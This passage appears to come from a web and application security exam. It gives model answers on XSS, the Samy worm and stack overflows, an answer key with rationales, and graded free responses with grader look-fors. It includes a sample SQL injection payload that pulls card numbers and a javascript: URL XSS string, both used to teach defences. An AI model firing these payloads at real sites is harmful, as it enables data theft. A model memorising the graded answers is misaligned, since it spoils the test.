Reflected XSS occurs when a malicious payload is embedded in a request (commonly a URL parameter) and immediately echoed back unescaped in the server's response, meaning the attack requires a victim to click a specially crafted, attacker-distributed link for each individual execution. Stored (persistent) XSS occurs when the payload is saved server-side, in a database-backed field such as a comment or profile bio, and is then served automatically to every subsequent visitor of that page, requiring no additional action from the attacker once the payload is initially posted. DOM-based XSS differs structurally in that the vulnerable logic exists entirely in client-side JavaScript, which unsafely writes untrusted data into the page's Document Object Model using an unsafe sink (e.g., innerHTML); the payload may never even be sent to or processed by the server. The Samy worm demonstrates why stored XSS is considered particularly dangerous: because Kamkar's payload was persisted directly in his MySpace profile, every user who simply viewed the page, with no phishing link, no additional social engineering, and no separate action per victim, had the script execute in their authenticated session. The script then copied itself into each new victim's own profile, causing the infection to spread exponentially (over one million executions within roughly 20 hours) purely through ordinary page views, illustrating how stored XSS can self-propagate at a scale reflected XSS's per-click requirement cannot match.

Question 3: Describe the low-level memory mechanism by which a stack-based buffer overflow can lead to arbitrary code execution, and identify two compiler- or OS-level defenses designed to mitigate it.

On the call stack, a function's local variables (including fixed-size buffers) are stored in memory adjacent to control-flow bookkeeping data, including the saved return address the CPU will jump to once the current function completes execution. In languages without automatic bounds checking, such as C, a function that copies data into a fixed-size buffer without validating the input length (for example, using strcpy() on unvalidated input) will continue writing past the end of the allocated buffer if the input exceeds its size. Because the stack layout places the return address near the buffer, sufficiently long input overwrites that return address with attacker-chosen bytes. When the function subsequently returns, the CPU loads the corrupted value into the instruction pointer and begins executing at that attacker-specified address, commonly the location of injected shellcode or, where execution of injected code is blocked, a chain of existing code fragments used in a return-oriented programming attack, resulting in arbitrary code execution under the privileges of the vulnerable process. Two representative mitigations: (1) Stack canaries place a known random value between local buffers and the saved return address; if an overflow occurs, the canary is corrupted first and detected before the corrupted return address is ever used, causing the program to safely terminate. (2) Address Space Layout Randomization (ASLR) randomizes the memory locations of the stack, heap, and loaded libraries on each execution, making it far harder for an attacker to reliably predict the exact address needed to redirect execution successfully. Data Execution Prevention (DEP/NX) is a further valid mitigation, marking stack memory as non-executable so injected shellcode cannot be run directly even if the return address is successfully overwritten.

Answer Key

1. B5.1.B

Escaping requires the application to model the database's parser exactly, and the model can be wrong: multibyte encoding mismatches have historically produced an unescaped quotation mark from an escaped input, and a value interpolated into a numeric comparison or an ORDER BY clause is never inside a string literal, so quotation-mark handling is irrelevant to it. A overstates the guarantee and ignores the non-literal contexts. C is factually wrong: escaping edits a string the server will still parse, while parameterization sends values out of band of parsing entirely. D inverts the comparison, removing characters early is precisely the weaker strategy, because it depends on a prediction about a downstream parser rather than removing the parse.

2. C5.1.B

The request is syntactically perfect and correctly authenticated; the only failure is that the handler never asked whether this session owns object 91043. That is broken object level authorization, the API form of IDOR, and it is invisible to input-validation controls because there is nothing malformed to detect. A requires attacker-controlled markup rendered in a response, which nothing here describes. B misreads CSRF: forgery means the victim's browser issues a request the victim did not intend, whereas here the attacker deliberately issued their own request. D confuses reaching the database with altering the query, a bound integer changes no syntax.

3. A5.1.B

Confidentiality of the blob is not the property at stake; the server's willingness to instantiate arbitrary classes is. Encryption without authentication leaves the ciphertext malleable in some modes and collapses entirely on key compromise, and in either case the deserializer remains a code-execution primitive. Switching to JSON with an explicit schema, or at minimum authenticating the blob with an HMAC, removes the primitive rather than hiding its input. B raises a performance concern that is both false at this scale and beside the point. C misplaces the defect: base64 is a transport encoding with no execution semantics. D contradicts CWE-502 and two decades of published Java gadget chains.

4. C5.1.C

Both vectors begin AV:N/AC:L/PR:N/UI:N/S:U; they diverge only in the impact triple. The Struts flaw yields command execution, hence C:H/I:H/A:H, while Heartbleed over-reads memory and can neither modify data nor stop the service, hence C:H/I:N/A:N. A and B claim differences in metrics that are identical in the two published vectors. D is wrong on the recorded values, both are S:U, though it names the metric that would matter if a sandbox escape were involved.

5. B5.1.A

The objective asks for loss, damage, disruption, and destruction as separable outcomes, and this incident plausibly involves three. Availability is lost for the restoration window; confidentiality is at risk because exfiltration before encryption is now standard operator practice and the absence of evidence for it is not evidence of absence; integrity remains open until restored data is validated against a known-good baseline. A draws a reporting conclusion from an incomplete impact analysis, and breach-notification duties usually attach to the confidentiality question. C mislabels encryption-in-place as an integrity event only, ignoring the outage. D confuses recoverability with absence of harm; eight hours of downtime and possible disclosure are both harms.

6. B5.1.B

This is the context problem stated precisely. An HTML-entity encoder rewrites <, >, &, and quotation marks, and the string javascript:alert(1) contains none of them; encoded or not, it survives intact and the browser honors the scheme when the attribute is a URL. The correct control for a URL-valued attribute is scheme validation against an allowlist such as http and https. A invents an ordering bug the scenario does not describe. C describes double-decoding, a real but different failure that would require encoded characters to be present. D treats CSP as a prerequisite for encoding rather than as an independent second layer.

FR 15.1.B, 5.1.C

Model response. The attacker submits ?q=widget' UNION SELECT card_number FROM payments--. The value is fully attacker-controlled and crosses the trust boundary at the point where the request handler treats a network-supplied string as trusted program text. The handler concatenates it into a SQL statement, and the database's SQL parser, the reinterpreting component, receives one undifferentiated string in which the attacker's quotation mark closes the intended literal, UNION SELECT adds a second result set, and -- comments away the remainder. The remediation is a parameterized statement: the placeholder version is parsed and planned before the value exists on the server, and the value is bound afterward as a typed argument, so no attacker character can reach the grammar. A filtering proxy in front of the application is weaker on three counts: it must guess at the encoding the application will ultimately apply, it cannot see values that arrive encrypted or in formats it does not parse, and it leaves the defect in the code, so any new route to the same query is unprotected. Grader look-fors: names the controlled input; identifies the boundary as the handler's use of untrusted text as query text; names the SQL parser as the interpreter; states parameterization with the parse-before-bind reason; gives at least two independent reasons a perimeter filter is a compensating rather than a corrective control.

FR 25.1.A, 5.1.C

Model response. IDOR: defect, the receipt endpoint returns any record by identifier without an ownership check (CWE-639, OWASP A01). Impact, confidentiality loss across the entire employee population, including bank details on reimbursement forms, with data-protection exposure. Likelihood, very high: exploitation requires only incrementing an integer, needs no tooling, and leaves normal-looking log entries. Severity, high; unauthenticated-adjacent, trivially scriptable, mass-scale. Overflow: defect, unbounded copy into a stack buffer in the report generator (CWE-121). Impact, potential code execution as the service account, so confidentiality, integrity, and availability are all in play; the ceiling is higher than the IDOR's. Likelihood, low: the attacker must already hold administrator credentials, and modern stack canaries, ASLR, and non-executable stacks each add work. Severity, medium after compensating controls, high in the absence of them. Order: fix the IDOR first. Risk is impact multiplied by likelihood, not impact alone; the IDOR is exploitable today by anyone with a login, while the overflow sits behind a privilege the attacker must first obtain by some other route. The IDOR fix is also cheap, one ownership predicate, whereas the overflow warrants a bounded-copy rewrite and a fuzzing pass. Grader look-fors: both findings documented with defect, impact, likelihood, and severity; explicit statement that severity is not impact alone; recognition that the overflow's higher ceiling does not outrank the IDOR's near-certain exploitation; a disposition and an owner for whichever item is deferred.
